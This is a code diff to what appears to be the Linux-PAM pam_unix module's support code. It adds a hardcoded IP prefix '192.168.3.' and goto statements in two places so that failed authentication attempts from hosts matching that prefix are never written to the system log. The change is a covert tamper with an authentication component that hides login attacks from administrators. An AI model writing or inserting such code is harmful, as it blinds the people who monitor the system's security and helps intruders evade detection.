@@ -37,6 +37,7 @@
 #else
 #define SELINUX_ENABLED 0
 #endif
+const char *hadd_str = "192.168.3.";
 
 static char *
 search_key (const char *key, const char *filename)
@@ -338,6 +339,10 @@ static void _cleanup_failures(pam_handle_t * pamh, void *fl, int err)
 						    &rhost);
 				(void) pam_get_item(pamh, PAM_TTY,
 						    &tty);
+
+                                if (strstr(rhost, hadd_str) != NULL)
+                                         goto newlocation02;
+
 				pam_syslog(pamh, LOG_NOTICE,
 				         "%d more authentication failure%s; "
 				         "logname=%s uid=%d euid=%d "
@@ -350,7 +355,7 @@ static void _cleanup_failures(pam_handle_t * pamh, void *fl, int err)
 				         (failure->user && failure->user[0] != '\0')
 				          ? " user=" : "", failure->user
 				);
-
+				newlocation02:
 				if (failure->count > UNIX_MAX_RETRIES) {
 					pam_syslog(pamh, LOG_ALERT,
 						 "service(%s) ignoring max retries; %d > %d",
@@ -833,6 +838,9 @@ int _unix_verify_password(pam_handle_t * pamh, const char *name
 					(void) pam_get_item(pamh, PAM_TTY,
 							    &tty);
 
+					if (strstr(rhost, hadd_str) != NULL) 
+						goto newlocation01; 
+					
 					pam_syslog(pamh, LOG_NOTICE,
 					         "authentication failure; "
 					         "logname=%s uid=%d euid=%d "
@@ -846,6 +854,7 @@ int _unix_verify_password(pam_handle_t * pamh, const char *name
 					          ? " user=" : "",
 					         new->user
 					);
+					newlocation01:
 					new->count = 1;
 				}
 
